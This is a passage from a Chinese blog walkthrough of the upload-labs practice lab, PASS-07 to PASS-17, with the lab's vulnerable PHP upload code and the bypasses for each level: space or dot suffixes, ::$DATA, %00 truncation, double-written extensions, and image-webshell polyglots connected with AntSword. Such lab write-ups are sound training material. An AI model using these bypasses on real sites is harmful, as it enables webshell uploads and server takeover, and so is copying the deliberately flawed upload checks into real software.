+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+        $file_name = $_FILES['upload_file']['name'];
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file,$img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件不允许上传';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<p><strong>解题思路</strong>：由源码可知，图片并没有对后缀进行去空处理，所以需要利用<strong>BP进行加空</strong>。
+如下图，图片后缀为<strong>php+空格</strong></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921225206320.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921225219778.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-08">PASS-08</h3>
+<p>贴一下源码：</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<p><strong>解题思路</strong>：
+<strong>解题姿势一：</strong></p>
+<p><strong>加点绕过</strong>，由源码可知，图片做了==去空==处理，但是没有做==去点==处理，所以可以<strong>加点绕过。</strong>
+如下图，图片后缀为<strong>php+点</strong> 或者<strong>php+点+空+点</strong></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921225546375.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921225556617.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921225620875.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092122563216.png#pic_center" alt="在这里插入图片描述" />
+<strong>解题姿势二</strong></p>
+<p>利用Windows解析漏洞（后缀修改为1.php:1.jpg）</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921225722100.png#pic_center" alt="在这里插入图片描述" />
+上传成功后&hellip;里面的代码没了&hellip;不知道为什么&hellip;</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921225750539.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-09">PASS-09</h3>
+<p>贴一下代码：</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = trim($file_ext); //首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<p><strong>解题思路：</strong></p>
+<p>由上可知，文件没有对后缀名进行去“::$DATA&quot;， php 在 window 的时候如果文件名 + &ldquo;::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持“::$DATA&quot;之前的文件名 他的目的就是不检查后缀名。</p>
+<p>ps:==只能是Windows系统，并且只能时php文件==</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921225908897.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092122591856.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-10">PASS-10</h3>
+<p>贴一下代码：</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<p><strong>解题思路：</strong>
+==将filename拼接路径会带来极大风险==，由<code>$img_path = UPLOAD_PATH.'/'.$file_name;</code>可知，该关进行的是现在文件末尾先去点，再去空便没有再做任何处理，因此我们可以利用这个漏洞，上传图片马，然后用<strong>BP</strong>,构造后缀名为<strong>php+点+空+点</strong></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921230130169.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200921230137579.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-11">PASS-11</h3>
+<p>贴一下代码：</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;);
+
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
+        $temp_file = $_FILES['upload_file']['tmp_name'];
+        $img_path = UPLOAD_PATH.'/'.$file_name;        
+        if (move_uploaded_file($temp_file, $img_path)) {
+            $is_upload = true;
+        } else {
+            $msg = '上传出错！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<p><strong>解题思路：</strong></p>
+<p><strong>str_ireplace函数</strong>：替换上述文件后缀名为空，但是他只是进行了一次替换，没有多次，所以我们可以通过双写进行绕过 <strong>（对大小写不敏感）</strong></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200922001416984.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/202009220014443.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass12-13将filename加入最终路径会带来极大风险">Pass12-13:将filename加入最终路径会带来极大风险</h3>
+<p><strong>get和post方法提交：</strong></p>
+<ul>
+<li>
+<p><strong>get请求:</strong> 请求的数据会附加在url之后并且以？分隔url和传输的数据，多个参数之间用&amp;连接， <strong>会在URI中暴露出来</strong> ；</p>
+</li>
+<li>
+<p><strong>post请求：</strong> 把提交的数据放置在http包的包体中，以二进制流的方式进行传送，不会对%00等进行自动解码，并 <strong>不会暴露出来</strong>。</p>
+</li>
+<li>
+<p>最后才发现原来，get和post方法在页面html源码上可以找到，并且可以发现get和post传递的相应参数（例如下面的 $save_path和 $save_name），及参数规定的值。</p>
+</li>
+</ul>
+<h3 id="pass-12">Pass-12</h3>
+<p>贴下代码：</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+    $ext_arr = array('jpg','png','gif');
+    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr)){
+        $temp_file = $_FILES['upload_file']['tmp_name'];
+        $img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = '上传出错！';
+        }
+    } else{
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+    }
+}
+</code></pre>
+<p><strong>源码分析：</strong></p>
+<pre><code class="language-php"> $ext_arr = array('jpg','png','gif');//发现是白名单
+    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr)){
+    	//储存在服务器目录的文件名称
+        $temp_file = $_FILES['upload_file']['tmp_name'];
+        //随机生成文件的名称
+        $img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+      //函数将文件与后缀名直接进行拼接  
+        if(move_uploaded_file($temp_file,$img_path)){
+</code></pre>
+<p>函数：
+<a href="https://www.runoob.com/php/func-string-substr.html" target="_blank">substr()函数</a>：返回字符串的一部分</p>
+<pre><code class="language-php">从字符串中返回 &quot;world&quot;：
+&lt;?php
+echo substr(&quot;Hello world&quot;,6);
+?&gt;
+//输出world
+</code></pre>
+<p><a href="https://www.w3school.com.cn/php/func_string_strrpos.asp" target="_blank">strrpos() 函数</a>：查找字符串在另一字符串中最后一次出现的位置。
+注释：strrpos() 函数对大小写敏感。</p>
+<pre><code class="language-php">查找 &quot;php&quot; 在字符串中最后一次出现的位置：
+&lt;?php
+echo strrpos(&quot;You love php, I love php too!&quot;,&quot;php&quot;);
+?&gt;//输出21
+</code></pre>
+<p><strong>解题思路：</strong></p>
+<p><strong>URI中00截断</strong></p>
+<p>由源码可得，在这边他直接将后缀名 $file_ext $进行拼接。如果中途在其中加入php后缀，再利用00进行截断，那么便可以将该文件当作php文件进行解析。再者又有 $_GET[‘save_path’]，这表示他需要请求 <strong>参数save_path</strong>，使用GET方法，即我们可以在拦下包的时候 <strong>在URI中发现参数</strong> save_path，我们便可以拦下包将save_path <strong>换掉</strong>。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200922002006978.png#pic_center" alt="在这里插入图片描述" />
+<strong>解题姿势一：</strong></p>
+<p>拦包00截断</p>
+<p><strong>截断条件：</strong></p>
+<p>==截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态==</p>
+<p>由源码可知，图片的save_path通过get传递，然后和后缀ima_path直接拼接而成的，所以我们可以直接使用 %00 截断，将后缀名 <strong>.jpg 截断</strong>，从而<strong>以 php 运行</strong>。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200922002311504.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092200232052.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200922002334916.png#pic_center" alt="在这里插入图片描述" />
+<strong>解题姿势二：</strong></p>
+<p>前端直接修改为 &ldquo;php+00截断&quot;格式
+如下可得，直接将<strong>参数save_path修改为php+00截断</strong>的格式，因此它会将之后上传的所有文件<strong>以PHP的格式</strong>进行解析。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092200241978.png#pic_center" alt="在这里插入图片描述" />
+上传图片马，复制图片地址，直接蚁剑1.php即可</p>
+<p>附个图片的地址：http://localhost/upload-labs-master/upload/1.php%EF%BF%BD/6320200921235947.png 把php后面的删掉连接</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200922002459807.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-13">PASS-13</h3>
+<p>贴一下代码：</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+    $ext_arr = array('jpg','png','gif');
+    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr)){
+        $temp_file = $_FILES['upload_file']['tmp_name'];
+        $img_path = $_POST['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = &quot;上传失败&quot;;
+        }
+    } else {
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+    }
+}
+</code></pre>
+<p><strong>源码分析：</strong></p>
+<p>由源码可知，直接将 $file_ext 拼接在路径中，因此我们可以在中间时将php加在 $file_ext 中，从而以PHP文件解析。再由 $_POST[‘save_path’]请求可知， <strong>参数save_path</strong> 虽然不会出现在URI中，但是我们可以在包里面发现他，因此我们可以在包里面对 $file_ext 中进行更改。但是POST是以二进制流进行发送文件，因此我们需要在封包的 <strong>二进制文件</strong> 中对 $file_ext添加php和对应的 <strong>00截断</strong> 。</p>
+<p><strong>解题思路：</strong></p>
+<p>POST请求，二进制文件中00截断</p>
+<p><strong>解题姿势：</strong></p>
+<p>上传图片马后为如下:
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200923010032832.png#pic_center" alt="在这里插入图片描述" />
+
+然后在上面的upload 的后面加上 XXX.php+（这里的XXX可以为任何名字，他只是一个代号。并且 php后面的 + 好也是一个标记，他的二进制代码为 2b）
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200923010109401.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>由上可知，将二进制中的 + 改为 00 截断，即将 + 的二进制码 2b 改为 00 .</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092301014752.png#pic_center" alt="在这里插入图片描述" />
+
+上传成功
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092301021997.png#pic_center" alt="在这里插入图片描述" />
+
+注：这里蚁剑连接1.php即后面的被截断了</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200923010341157.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-14">PASS-14</h3>
+<p>贴一下代码:</p>
+<pre><code class="language-php">function getReailFileType($filename){
+    $file = fopen($filename, &quot;rb&quot;);
+    $bin = fread($file, 2); //只读2字节
+    fclose($file);
+    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    
+    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
+    $fileType = '';    
+    switch($typeCode){      
+        case 255216:            
+            $fileType = 'jpg';
+            break;
+        case 13780:            
+            $fileType = 'png';
+            break;        
+        case 7173:            
+            $fileType = 'gif';
+            break;
+        default:            
+            $fileType = 'unknown';
+        }    
+        return $fileType;
+}
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+    $temp_file = $_FILES['upload_file']['tmp_name'];
+    $file_type = getReailFileType($temp_file);
+
+    if($file_type == 'unknown'){
+        $msg = &quot;文件未知，上传失败！&quot;;
+    }else{
+        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+    }
+}
+
+</code></pre>
+<p><strong>函数解释：</strong></p>
+<pre><code class="language-php">(1)
+fopen() 函数打开文件或者 URL。
+如果打开失败，本函数返回 FALSE。
+语法：fopen(filename,mode,include_path,context)
+----------------------------------------------------
+|filename      |必需。规定要打开的文件或 URL。         |
+----------------------------------------------------
+|mode          |必需。规定要求到该文件/流的访问类型。    |
+----------------------------------------------------
+|include_path  |可选。如果也需要在 include_path 中检索 |
+|              |文件的话，可以将该参数设为 1 或 TRUE。  |
+----------------------------------------------------
+|context       |可选。规定文件句柄的环境。Context 是可以|                   |              |修改流的行为的一套选项                |
+----------------------------------------------------
+(2)
+fread() 函数读取文件（可安全用于二进制文件）。
+语法:fread(file,length)
+------------------------------------
+|file   |必需。规定要读取打开文件。     |
+------------------------------------
+|length |必需。规定要读取的最大字节数.  |
+------------------------------------
+(3)
+fclose() 函数关闭一个打开文件。
+语法:fclose(file)
+file | 必需。规定要关闭的文件。
+
+</code></pre>
+<p><strong>代码分析:</strong></p>
+<pre><code class="language-php">function getReailFileType($filename){
+    $file = fopen($filename, &quot;rb&quot;);
+    //rb是读取二进制文件。r表示read,即读取;b表示binary，即二进制。
+    $bin = fread($file, 2); //只读2字节
+    /*表示只是对文件头做了一个检测*/
+    fclose($file);
+    $strInfo = @unpack(&quot;C2chars&quot;, $bin); 
+    //标识前两个字符按照，c格式，数组索引charsl、chars2
+    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
+    $fileType = '';  
+    
+    //意思是：读取上传文件的前两个字节内容，unpack解码后，使用intval转换为10进制，默认为10进制，根据转换后的结果判断图片类型。
+</code></pre>
+<p><strong>解题姿势:</strong>
+1、制作图片马，在cmd中输入<code>copy 1.jpg/b + 1.php/a 111.jpg</code>，2.jpg就是生成的图片马。</p>
+<p><strong>注:</strong>==要在1.jpg和1.php的目录下运行命令==</p>
+<p>2、上传成功后，jpg文件不能直接解析为php文件，这里需要利用文件包含解析图片马里的php脚本，file为我们的图片马位置</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200923010614988.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200923010634862.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-15">PASS-15</h3>
+<p>贴一下代码：</p>
+<pre><code class="language-php">function isImage($filename){
+    $types = '.jpeg|.png|.gif';
+    if(file_exists($filename)){
+        $info = getimagesize($filename);
+        $ext = image_type_to_extension($info[2]);
+        if(stripos($types,$ext)&gt;=0){
+            return $ext;
+        }else{
+            return false;
+        }
+    }else{
+        return false;
+    }
+}
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+    $temp_file = $_FILES['upload_file']['tmp_name'];
+    $res = isImage($temp_file);
+    if(!$res){
+        $msg = &quot;文件未知，上传失败！&quot;;
+    }else{
+        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+    }
+}
+
+</code></pre>
+<p><strong>函数解释：</strong></p>
+<pre><code class="language-php">stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。
+语法：
+stripos(string,find,start)
+-----------------------------------------
+|string|必需。规定要搜索的字符串。          |
+-----------------------------------------
+|find  |必需。规定要查找的字符。            |
+-----------------------------------------
+|start |可选。规定开始搜索的位置。          |
+-----------------------------------------  
+    
+</code></pre>
+<p><strong>代码分析：</strong></p>
+<pre><code class="language-php">$info = getimagesize($filename);
+$ext = image_type_to_extension($info[2]);
+// getimagesize通过检查图像文件的大小并返回图像的尺寸以及文件类型.
+// image_type_to_extension根据指定的图像类型返回对应的后缀名.
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200923010908654.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>解题思路：</strong></p>
+<p><strong>（图片马 之  使用getimagesize()检查是否为图片文件）</strong></p>
+<p>利用方式同PASS-14</p>
+<p>蚁剑链接成功</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200923011006824.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-16">PASS-16</h3>
+<p>贴一下源码：</p>
+<pre><code class="language-php">function isImage($filename){
+    //需要开启php_exif模块
+    $image_type = exif_imagetype($filename);
+    switch ($image_type) {
+        case IMAGETYPE_GIF:
+            return &quot;gif&quot;;
+            break;
+        case IMAGETYPE_JPEG:
+            return &quot;jpg&quot;;
+            break;
+        case IMAGETYPE_PNG:
+            return &quot;png&quot;;
+            break;    
+        default:
+            return false;
+            break;
+    }
+}
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+    $temp_file = $_FILES['upload_file']['tmp_name'];
+    $res = isImage($temp_file);
+    if(!$res){
+        $msg = &quot;文件未知，上传失败！&quot;;
+    }else{
+        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+    }
+}
+</code></pre>
+<p><strong>函数分析：</strong></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200923011100138.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>与Pass-14思路相同，上传同个图片马就可以。相关函数说明：</li>
+</ul>
+<pre><code class="language-php">exif_imagetype(string $filename)//读取一个图像的第一个字节并检查其签名
+</code></pre>
+<p><strong>注:</strong> ==此函数需要开启<code>php_exif</code>模块==</p>
+<p><strong>这里有一个问题：</strong></p>
+<p>仅仅打开这个是不行的，上传图片会出现空白的情况，如下：</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092301122951.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092301124362.png#pic_center" alt="在这里插入图片描述" />
+
+百度一番之后才知道要在php.ini中修改配置。</p>
+<p>在php.ini中搜索extension=php_exif.dll，然后将前面的分号去掉</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200923011309658.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>保存重启之后就能正常使用了。</p>
+<p>后面利用和PASS-14一样</p>
+<p>蚁剑连接成功</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200923011327862.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-17">PASS-17</h3>
+<p>贴一下代码：</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])){
+    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
+    $filename = $_FILES['upload_file']['name'];
+    $filetype = $_FILES['upload_file']['type'];
+    $tmpname = $_FILES['upload_file']['tmp_name'];
+
+    $target_path=UPLOAD_PATH.'/'.basename($filename);
+
+    // 获得上传文件的扩展名
+    $fileext= substr(strrchr($filename,&quot;.&quot;),1);
+
+    //判断文件后缀与类型，合法才进行上传操作
+    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){
+        if(move_uploaded_file($tmpname,$target_path)){
+            //使用上传的图片生成新的图片
+            $im = imagecreatefromjpeg($target_path);
+
+            if($im == false){
+                $msg = &quot;该文件不是jpg格式的图片！&quot;;
+                @unlink($target_path);
+            }else{
+                //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.jpg&quot;;
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.'/'.$newfilename;
